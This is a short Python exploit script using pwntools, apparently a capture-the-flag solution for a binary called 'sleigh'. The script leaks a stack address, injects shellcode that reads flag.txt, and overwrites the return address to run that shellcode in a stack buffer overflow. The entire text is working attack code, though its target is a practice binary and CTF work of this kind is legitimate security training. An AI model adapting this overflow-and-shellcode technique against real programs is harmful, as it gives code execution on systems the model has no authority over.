# ToBeatElite

from pwn import *

def main():
    
    context.update(arch='amd64', os='linux')
    my_process = process('./sleigh')

    my_process.sendlineafter(b'>', b'1')
    my_address = my_process.recvuntil(b'>').split()[9][1:15]
    log.info(f'Found Stack Address : {my_address.decode()}')

    shellcode = asm(shellcraft.cat('flag.txt'))

#    padding = b'A' * (72 - len(shellcode))
    padding = b'A' * 28
    payload = flat(
        shellcode,
        padding,
        int(my_address, 16)
    )

    my_process.sendline(payload)
    log.info('Sending Payload')
    my_process.recvline()

    my_process.interactive()

if __name__ == '__main__':
    try: main()
    except Exception as my_ex: print(my_ex)
